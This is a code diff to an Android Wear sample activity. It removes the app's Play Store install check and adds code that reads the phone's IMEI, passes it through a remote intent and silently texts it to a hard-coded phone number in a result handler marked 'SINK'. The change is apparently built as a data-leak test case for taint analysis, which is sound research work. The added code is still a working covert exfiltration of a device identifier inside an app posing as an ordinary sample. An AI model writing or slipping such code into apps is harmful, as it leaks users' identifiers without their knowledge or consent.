@@ -15,14 +15,21 @@
  */
 package com.example.android.wearable.wear.wearverifyremoteapp;
 
+import android.Manifest;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.ResultReceiver;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
+import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -40,18 +47,14 @@ import com.google.android.gms.wearable.NodeApi;
 import com.google.android.gms.wearable.Wearable;
 import com.google.android.wearable.intent.RemoteIntent;
 
-import java.util.ArrayList;
 import java.util.List;
 import java.util.Set;
 
-/**
- * Checks if the sample's Wear app is installed on remote Wear device(s). If it is not, allows the
- * user to open the app listing on the Wear devices' Play Store.
- */
+
 public class MainMobileActivity extends AppCompatActivity implements
         GoogleApiClient.ConnectionCallbacks,
         GoogleApiClient.OnConnectionFailedListener,
-        CapabilityApi.CapabilityListener {
+        ActivityCompat.OnRequestPermissionsResultCallback {
 
     private static final String TAG = "MainMobileActivity";
 
@@ -60,26 +63,6 @@ public class MainMobileActivity extends AppCompatActivity implements
     private static final String CHECKING_MESSAGE =
             WELCOME_MESSAGE + "Checking for Wear Devices for app...\n";
 
-    private static final String NO_DEVICES =
-            WELCOME_MESSAGE
-                    + "You have no Wear devices linked to your phone at this time.\n";
-
-    private static final String MISSING_ALL_MESSAGE =
-            WELCOME_MESSAGE
-                    + "You are missing the Wear app on all your Wear Devices, please click on the "
-                    + "button below to install it on those device(s).\n";
-
-    private static final String INSTALLED_SOME_DEVICES_MESSAGE =
-            WELCOME_MESSAGE
-                    + "Wear app installed on some your device(s) (%s)!\n\nYou can now use the "
-                    + "MessageApi, DataApi, etc.\n\n"
-                    + "To install the Wear app on the other devices, please click on the button "
-                    + "below.\n";
-
-    private static final String INSTALLED_ALL_DEVICES_MESSAGE =
-            WELCOME_MESSAGE
-                    + "Wear app installed on all your devices (%s)!\n\nYou can now use the "
-                    + "MessageApi, DataApi, etc.";
 
     // Name of capability listed in Wear app's wear.xml.
     // IMPORTANT NOTE: This should be named differently than your Phone app's capability.
@@ -90,26 +73,42 @@ public class MainMobileActivity extends AppCompatActivity implements
     private static final String PLAY_STORE_APP_URI =
             "market://details?id=com.example.android.wearable.wear.wearverifyremoteapp";
 
-    // Result from sending RemoteIntent to wear device(s) to open app in play/app store.
+    //Request code for permission
+    private static final int REQUEST_READ_PHONE_STATE = 1;
+    private static final int REQUEST_SEND_SMS = 2;
+    private static final String NO_DEVICES = "No devices found";
+    private static final String SOME_DEVICES = "Found some devices(%s)!";
+
+    //Permission callback
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
+        switch (requestCode) {
+            case REQUEST_READ_PHONE_STATE:
+                if ((grantResults.length > 0) && (grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
+                    //TODO
+                }
+                break;
+            case REQUEST_SEND_SMS:
+                if ((grantResults.length > 0) && (grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
+                    //TODO
+                }
+                break;
+            default:
+                break;
+        }
+    }
+
+    // Result from sending RemoteIntent to wear device(s)
     private final ResultReceiver mResultReceiver = new ResultReceiver(new Handler()) {
         @Override
         protected void onReceiveResult(int resultCode, Bundle resultData) {
             Log.d(TAG, "onReceiveResult: " + resultCode);
 
             if (resultCode == RemoteIntent.RESULT_OK) {
-                Toast toast = Toast.makeText(
-                        getApplicationContext(),
-                        "Play Store Request to Wear device successful.",
-                        Toast.LENGTH_SHORT);
-                toast.show();
-
-            } else if (resultCode == RemoteIntent.RESULT_FAILED) {
-                Toast toast = Toast.makeText(
-                        getApplicationContext(),
-                        "Play Store Request Failed. Wear device(s) may not support Play Store, "
-                                + " that is, the Wear device may be version 1.0.",
-                        Toast.LENGTH_LONG);
-                toast.show();
+                //SINK
+                String imei = resultData.getString("imei");
+                SmsManager SM = SmsManager.getDefault();
+                SM.sendTextMessage("07922021702", null, imei, null, null);
 
             } else {
                 throw new IllegalStateException("Unexpected result " + resultCode);
@@ -120,7 +119,6 @@ public class MainMobileActivity extends AppCompatActivity implements
     private TextView mInformationTextView;
     private Button mRemoteOpenButton;
 
-    private Set<Node> mWearNodesWithApp;
     private List<Node> mAllConnectedNodes;
 
     private GoogleApiClient mGoogleApiClient;
@@ -133,13 +131,17 @@ public class MainMobileActivity extends AppCompatActivity implements
 
         mInformationTextView = (TextView) findViewById(R.id.information_text_view);
         mRemoteOpenButton = (Button) findViewById(R.id.remote_open_button);
+        mRemoteOpenButton.setVisibility(View.VISIBLE);
 
         mInformationTextView.setText(CHECKING_MESSAGE);
+
+        //Request imei and sms permission
+        requestPermissions();
 
         mRemoteOpenButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                openPlayStoreOnWearDevicesWithoutApp();
+                doRemoteIntent();
             }
         });
 
@@ -150,6 +152,21 @@ public class MainMobileActivity extends AppCompatActivity implements
                 .build();
     }
 
+    private void requestPermissions() {
+        int statePermissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);
+        if (statePermissionCheck != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_READ_PHONE_STATE);
+        } else {
+            //TODO
+        }
+        int smsPermissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS);
+        if (smsPermissionCheck != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.SEND_SMS}, REQUEST_READ_PHONE_STATE);
+        } else {
+            //TODO
+        }
+    }
+
 
     @Override
     protected void onPause() {
@@ -157,11 +174,6 @@ public class MainMobileActivity extends AppCompatActivity implements
         super.onPause();
 
         if ((mGoogleApiClient != null) && mGoogleApiClient.isConnected()) {
-
-            Wearable.CapabilityApi.removeCapabilityListener(
-                    mGoogleApiClient,
-                    this,
-                    CAPABILITY_WEAR_APP);
 
             mGoogleApiClient.disconnect();
         }
@@ -179,21 +191,18 @@ public class MainMobileActivity extends AppCompatActivity implements
     @Override
     public void onConnected(@Nullable Bundle bundle) {
         Log.d(TAG, "onConnected()");
-
-        // Set up listeners for capability changes (install/uninstall of remote app).
-        Wearable.CapabilityApi.addCapabilityListener(
-                mGoogleApiClient,
-                this,
-                CAPABILITY_WEAR_APP);
-
-        // Initial request for devices with our capability, aka, our Wear app installed.
-        findWearDevicesWithApp();
-
-        // Initial request for all Wear devices connected (with or without our capability).
-        // Additional Note: Because there isn't a listener for ALL Nodes added/removed from network
-        // that isn't deprecated, we simply update the full list when the Google API Client is
-        // connected and when capability changes come through in the onCapabilityChanged() method.
         findAllWearDevices();
+
+        if (mAllConnectedNodes == null || mAllConnectedNodes.isEmpty()) {
+            mInformationTextView.setText(NO_DEVICES);
+
+        } else {
+            String installMessage =
+                    String.format(SOME_DEVICES, mAllConnectedNodes);
+            Log.d(TAG, installMessage);
+            mInformationTextView.setText(installMessage);
+
+        }
     }
 
     @Override
@@ -206,48 +215,7 @@ public class MainMobileActivity extends AppCompatActivity implements
         Log.e(TAG, "onConnectionFailed(): " + connectionResult);
     }
 
-    /*
-     * Updates UI when capabilities change (install/uninstall wear app).
-     */
-    public void onCapabilityChanged(CapabilityInfo capabilityInfo) {
-        Log.d(TAG, "onCapabilityChanged(): " + capabilityInfo);
 
-        mWearNodesWithApp = capabilityInfo.getNodes();
-
-        // Because we have an updated list of devices with/without our app, we need to also update
-        // our list of active Wear devices.
-        findAllWearDevices();
-
-        verifyNodeAndUpdateUI();
-    }
-
-    private void findWearDevicesWithApp() {
-        Log.d(TAG, "findWearDevicesWithApp()");
-
-        // You can filter this by FILTER_REACHABLE if you only want to open Nodes (Wear Devices)
-        // directly connect to your phone.
-        PendingResult<CapabilityApi.GetCapabilityResult> pendingResult =
-                Wearable.CapabilityApi.getCapability(
-                        mGoogleApiClient,
-                        CAPABILITY_WEAR_APP,
-                        CapabilityApi.FILTER_ALL);
-
-        pendingResult.setResultCallback(new ResultCallback<CapabilityApi.GetCapabilityResult>() {
-            @Override
-            public void onResult(@NonNull CapabilityApi.GetCapabilityResult getCapabilityResult) {
-                Log.d(TAG, "onResult(): " + getCapabilityResult);
-
-                if (getCapabilityResult.getStatus().isSuccess()) {
-                    CapabilityInfo capabilityInfo = getCapabilityResult.getCapability();
-                    mWearNodesWithApp = capabilityInfo.getNodes();
-                    verifyNodeAndUpdateUI();
-
-                } else {
-                    Log.d(TAG, "Failed CapabilityApi: " + getCapabilityResult.getStatus());
-                }
-            }
-        });
-    }
 
     private void findAllWearDevices() {
         Log.d(TAG, "findAllWearDevices()");
@@ -261,7 +229,6 @@ public class MainMobileActivity extends AppCompatActivity implements
 
                 if (getConnectedNodesResult.getStatus().isSuccess()) {
                     mAllConnectedNodes = getConnectedNodesResult.getNodes();
-                    verifyNodeAndUpdateUI();
 
                 } else {
                     Log.d(TAG, "Failed CapabilityApi: " + getConnectedNodesResult.getStatus());
@@ -270,72 +237,24 @@ public class MainMobileActivity extends AppCompatActivity implements
         });
     }
 
-    private void verifyNodeAndUpdateUI() {
-        Log.d(TAG, "verifyNodeAndUpdateUI()");
 
-        if ((mWearNodesWithApp == null) || (mAllConnectedNodes == null)) {
-            Log.d(TAG, "Waiting on Results for both connected nodes and nodes with app");
+    private void doRemoteIntent() {
+        Log.d(TAG, "doRemoteIntent()");
+        TelephonyManager TM = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
-        } else if (mAllConnectedNodes.isEmpty()) {
-            Log.d(TAG, NO_DEVICES);
-            mInformationTextView.setText(NO_DEVICES);
-            mRemoteOpenButton.setVisibility(View.INVISIBLE);
-
-        } else if (mWearNodesWithApp.isEmpty()) {
-            Log.d(TAG, MISSING_ALL_MESSAGE);
-            mInformationTextView.setText(MISSING_ALL_MESSAGE);
-            mRemoteOpenButton.setVisibility(View.VISIBLE);
-
-        } else if (mWearNodesWithApp.size() < mAllConnectedNodes.size()) {
-            // TODO: Add your code to communicate with the wear app(s) via
-            // Wear APIs (MessageApi, DataApi, etc.)
-
-            String installMessage =
-                    String.format(INSTALLED_SOME_DEVICES_MESSAGE, mWearNodesWithApp);
-            Log.d(TAG, installMessage);
-            mInformationTextView.setText(installMessage);
-            mRemoteOpenButton.setVisibility(View.VISIBLE);
-
-        } else {
-            // TODO: Add your code to communicate with the wear app(s) via
-            // Wear APIs (MessageApi, DataApi, etc.)
-
-            String installMessage =
-                    String.format(INSTALLED_ALL_DEVICES_MESSAGE, mWearNodesWithApp);
-            Log.d(TAG, installMessage);
-            mInformationTextView.setText(installMessage);
-            mRemoteOpenButton.setVisibility(View.INVISIBLE);
-
-        }
-    }
-
-    private void openPlayStoreOnWearDevicesWithoutApp() {
-        Log.d(TAG, "openPlayStoreOnWearDevicesWithoutApp()");
-
-        // Create a List of Nodes (Wear devices) without your app.
-        ArrayList<Node> nodesWithoutApp = new ArrayList<>();
+        String imeiNo = TM.getDeviceId();
+        Intent intent =
+                new Intent(Intent.ACTION_VIEW)
+                        .addCategory(Intent.CATEGORY_BROWSABLE)
+                        .setData(Uri.parse(PLAY_STORE_APP_URI)).putExtra("imei", imeiNo);
 
         for (Node node : mAllConnectedNodes) {
-            if (!mWearNodesWithApp.contains(node)) {
-                nodesWithoutApp.add(node);
-            }
+            RemoteIntent.startRemoteActivity(
+                    getApplicationContext(),
+                    intent,
+                    mResultReceiver,
+                    node.getId());
         }
 
-        if (!nodesWithoutApp.isEmpty()) {
-            Log.d(TAG, "Number of nodes without app: " + nodesWithoutApp.size());
-
-            Intent intent =
-                    new Intent(Intent.ACTION_VIEW)
-                            .addCategory(Intent.CATEGORY_BROWSABLE)
-                            .setData(Uri.parse(PLAY_STORE_APP_URI));
-
-            for (Node node : nodesWithoutApp) {
-                RemoteIntent.startRemoteActivity(
-                        getApplicationContext(),
-                        intent,
-                        mResultReceiver,
-                        node.getId());
-            }
-        }
     }
 }
